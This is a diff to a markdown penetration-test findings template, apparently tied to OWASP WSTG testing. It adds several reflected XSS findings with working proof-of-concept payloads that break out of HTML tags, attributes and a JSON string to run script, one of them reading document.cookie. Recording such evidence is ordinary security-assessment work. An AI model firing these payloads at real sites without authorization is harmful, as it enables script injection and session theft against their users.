@@ -281,7 +281,7 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 
 ### 2. Findings
 
-*Use one block per confirmed vulnerability.*
+*Divide in two blocks: gathering and finding. Gathering should be quick and straightforward. Finding should be concise and contain the successful payload. Think about merging both*
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -290,7 +290,9 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Type and technique:** `GET XSS reflected`
 - **Evidence:** `All chars accepted`
 - **Flag / value:** ```page=zzXSS9f2a'\"<>\`\\\${{7*7}}```
-- **Impact:** `Direct injection - 1 occurrence`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML href attribute`
+- **Payload**: `page?="></a><script>alert(1);</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -301,7 +303,9 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payload**: `page?=</p><script>alert(document.domain)</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -312,7 +316,11 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script> / JS injection`
+- **Target**: `HTML body / JavaScript`
+- **Payloads**: 
+    - Causing error, so HTML is injected in body through JavaScript: `ToolID='''[['</td><script>alert(document.domain)</script>`
+    - Breaking the JSON at JavaScript: `12312321"}});alert(document.domain);--`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -323,7 +331,10 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Close style attribute and proceed with injection: `background_color="><script>alert(document.domain)</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -334,7 +345,10 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (full chars): `textfile=</p><script>alert(document.domain)</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -345,7 +359,11 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `</td><script>alert(document.domain)</script>`
+    - Causing error, so HTML is injected in body through JavaScript: `'''[]</td><script>alert(document.domain)</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -356,7 +374,10 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `</h2><script>alert(document.domain)</script>`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -367,7 +388,10 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Flag / value:**
     - ```zzXSS9f2a'"<>`\${{7*7}}```
     - ```zzXSS9f2a'&quot;&lt;&gt;`\${{7*7}}```
-- **Impact:** `Direct injection - HTML attribute injection - JS string injection - URL injection - Several occurrences`
+- **Impact:** `HTML injection with <script>`
+- **Target**: `HTML body`
+- **Payloads**: 
+    - Direct html body injection (no errors): `'''[[</td><script>alert(document.cookie)</script>`
 
 #### `<WSTG-ID>` · `<Finding title>`
 
@@ -377,8 +401,6 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Evidence:** `recon/<file>` (line `<n>`), or screenshot
 - **Flag / value:** `<value>`
 - **Impact:** `<one line>`
-
-
 
 ### 3. Next steps
 
